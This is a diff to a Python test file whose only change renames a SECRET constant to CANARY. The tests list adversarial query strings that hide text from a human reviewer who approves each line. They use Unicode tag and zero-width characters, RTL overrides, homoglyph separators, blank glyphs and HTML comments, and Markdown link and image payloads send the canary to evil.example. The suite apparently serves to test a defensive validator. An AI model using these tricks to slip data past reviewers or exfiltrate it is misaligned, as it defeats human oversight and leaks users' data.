@@ -573,15 +573,15 @@ class LifecycleTest(ForgeTestCase):
 
 # -------------------------------------------------------------------- review round 1
 
-SECRET = "acct 4111-1111"
-TAGGED = "".join(chr(0xE0000 + ord(c)) for c in SECRET)
+CANARY = "acct 4111-1111"
+TAGGED = "".join(chr(0xE0000 + ord(c)) for c in CANARY)
 # The reviewer's f1 cases: each hides text from Noah in a line he would tick.
 HIDDEN_QUERIES = [
     "rocm install guide" + TAGGED,                         # Unicode tag characters
     "rocm​‌‍⁠ driver",                 # zero-width characters
     "‮gnp.tohsneercs",                                # RTL override
-    "amd gpu <!-- " + SECRET + " --> tuning",              # inline HTML comment
-    "rocm guide ‒ why: plain text " + SECRET,         # figure dash fakes the separator
+    "amd gpu <!-- " + CANARY + " --> tuning",              # inline HTML comment
+    "rocm guide ‒ why: plain text " + CANARY,         # figure dash fakes the separator
     "rocm guide　x",                              # NBSP / ideographic space
     "rocm️ guide",                                    # variation selector
     "rocm\U000f0000 guide",                                # private use
@@ -653,24 +653,24 @@ class HiddenTextTest(ForgeTestCase):
 # Review round 2 (f5): lookalike separators and blank glyphs that passed the visible-character
 # rules. Queries and justifications are printable ASCII now (CONTRACTS §12.9, round 2).
 F5_SPOOFS = {
-    "box-drawing dash U+2500": f"rocm guide ─ why: official docs {SECRET}",
-    "katakana long vowel U+30FC": f"rocm guide ー why: official docs {SECRET}",
-    "CJK one U+4E00": f"rocm guide 一 why: official docs {SECRET}",
-    "hyphen bullet U+2043": f"rocm guide ⁃ why: official docs {SECRET}",
-    "Cyrillic h in why": f"rocm guide — wһy: official docs {SECRET}",
-    "fullwidth colon": f"rocm guide — why： official docs {SECRET}",
-    "modifier colon U+A789": f"rocm guide — why꞉ official docs {SECRET}",
-    "combining mark after dash": f"rocm guide —́ why: official docs {SECRET}",
-    "combining mark on w": f"rocm guide — ẉhy: official docs {SECRET}",
-    "NBSP before dash": f"rocm guide — why: official docs {SECRET}",
-    "Hangul filler": f"rocm guideㅤ{SECRET}",
-    "braille blank": f"rocm guide⠀{SECRET}",
+    "box-drawing dash U+2500": f"rocm guide ─ why: official docs {CANARY}",
+    "katakana long vowel U+30FC": f"rocm guide ー why: official docs {CANARY}",
+    "CJK one U+4E00": f"rocm guide 一 why: official docs {CANARY}",
+    "hyphen bullet U+2043": f"rocm guide ⁃ why: official docs {CANARY}",
+    "Cyrillic h in why": f"rocm guide — wһy: official docs {CANARY}",
+    "fullwidth colon": f"rocm guide — why： official docs {CANARY}",
+    "modifier colon U+A789": f"rocm guide — why꞉ official docs {CANARY}",
+    "combining mark after dash": f"rocm guide —́ why: official docs {CANARY}",
+    "combining mark on w": f"rocm guide — ẉhy: official docs {CANARY}",
+    "NBSP before dash": f"rocm guide — why: official docs {CANARY}",
+    "Hangul filler": f"rocm guideㅤ{CANARY}",
+    "braille blank": f"rocm guide⠀{CANARY}",
     "Khitan filler U+16FE4": "rocm guide" + "\U00016fe4" * 5,
-    "Egyptian full blank U+13441": f"rocm guide\U00013441{SECRET}",
-    "Egyptian blank U+13442": f"rocm guide\U00013442{SECRET}",
+    "Egyptian full blank U+13441": f"rocm guide\U00013441{CANARY}",
+    "Egyptian blank U+13442": f"rocm guide\U00013442{CANARY}",
     "ideographic half fill U+303F": "rocm guide〿",
-    "ASCII hyphen separator": f"rocm guide - why: official docs {SECRET}",
-    "ASCII hyphen no space": f"rocm guide -why: official docs {SECRET}",
+    "ASCII hyphen separator": f"rocm guide - why: official docs {CANARY}",
+    "ASCII hyphen no space": f"rocm guide -why: official docs {CANARY}",
 }
 
 
@@ -713,16 +713,16 @@ class AsciiQueryTest(ForgeTestCase):
 # Review round 3 (f8): Markdown/HTML that a viewer renders, in plain ASCII. The image case is
 # the blocker: Obsidian/Open WebUI fetch it as soon as the file is shown, before any tick.
 F8_RENDER = {
-    "md link hides target": f"rocm [install guide](https://evil.example/?d={SECRET})",
-    "md image (viewer fetches!)": f"rocm guide ![](https://evil.example/p.png?d={SECRET})",
-    "html entity em dash": f"rocm guide &#8212; why: official docs {SECRET}",
-    "named entity &mdash;": f"rocm guide &mdash; why: official docs {SECRET}",
-    "why: with no dash": f"rocm guide why: official docs {SECRET}",
+    "md link hides target": f"rocm [install guide](https://evil.example/?d={CANARY})",
+    "md image (viewer fetches!)": f"rocm guide ![](https://evil.example/p.png?d={CANARY})",
+    "html entity em dash": f"rocm guide &#8212; why: official docs {CANARY}",
+    "named entity &mdash;": f"rocm guide &mdash; why: official docs {CANARY}",
+    "why: with no dash": f"rocm guide why: official docs {CANARY}",
     "WHY: upper case": f"rocm guide WHY: official docs",
-    "tilde sep": f"rocm guide ~ why: official docs {SECRET}",
-    "strikethrough": f"rocm guide ~~{SECRET}~~",
-    "emphasis": f"rocm *guide* _{SECRET}_",
-    "backslash escapes": f"rocm guide \\- why: x {SECRET}",
+    "tilde sep": f"rocm guide ~ why: official docs {CANARY}",
+    "strikethrough": f"rocm guide ~~{CANARY}~~",
+    "emphasis": f"rocm *guide* _{CANARY}_",
+    "backslash escapes": f"rocm guide \\- why: x {CANARY}",
     "double dash": "rocm guide -- why: x",
     "spaced dash": "rocm guide - why: x",
     "tab": "rocm\tguide",
